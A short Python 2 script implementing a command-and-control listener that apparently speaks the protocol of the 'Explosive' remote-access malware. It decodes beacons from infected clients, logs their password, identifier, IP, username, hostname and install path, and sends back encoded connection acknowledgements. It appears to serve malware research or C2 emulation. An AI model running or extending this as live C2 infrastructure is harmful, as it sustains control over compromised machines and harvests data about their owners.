import asyncore
import socket
import ExplosiveEnc
import time

HOST = "192.168.1.112"
PORT = 443

# C&C Return codes
CNC_REQUEST_NORMAL = 1
CNC_REQUEST_SECURE = 2

def ParseClientMsg(value):
    if not value:
        return None

    try:
        decoded_val = ExplosiveEnc.decode_comm(value)

    except Exception as ex:
        print "[*] %s Failed to decode client message: %s" % (time.ctime(), value)
        return None

    # Normal Client Request
    if "<`|`>" in decoded_val:
        print "[*] %s Normal C&C request received" % time.ctime()
        client_values = decoded_val.split("<`|`>")

        try:
            print "Password: %s" %client_values[0]
            print "Identifier: %s" %client_values[1]
            print "Client Internal IP: %s" %client_values[2]
            print "Username:PID: %s" %client_values[3]
            print "Hostname: %s" %client_values[4]
            print "System Name: %s" %client_values[5]
            print "Installation Path: %s" %client_values[6]

        except IndexError as err:
            print "Some client parameters seem to be missing."

        return CNC_REQUEST_NORMAL

    # Secure request
    elif "<!*secure*!>" in decoded_val:
        print "[*] %s Secure request received", time.ctime()
        return CNC_REQUEST_SECURE

    # Unknown Client Request
    else:
        print "[*] %s No parser available for (decoded) message: %s" % (time.ctime(), decoded_val)
        return None

class ExplosiveRequestHandler(asyncore.dispatcher_with_send):

    def handle_read(self):
        raw_data = self.recv(8192)
        if raw_data:

            ret_code = ParseClientMsg(raw_data)
            if ret_code == CNC_REQUEST_NORMAL:
                self.send(ExplosiveEnc.encode_comm("*`~!~`*<!*connectok*!>"))
            if ret_code == CNC_REQUEST_SECURE:
                self.send(ExplosiveEnc.encode_comm("*`~!~`*<!*securedok*!>"))

        self.close()

class EchoServer(asyncore.dispatcher):

    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(5)

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            sock, addr = pair
            print '[*] Got incoming connection from %s' % repr(addr)
            handler = ExplosiveRequestHandler(sock)

server = EchoServer(HOST, PORT)
asyncore.loop()


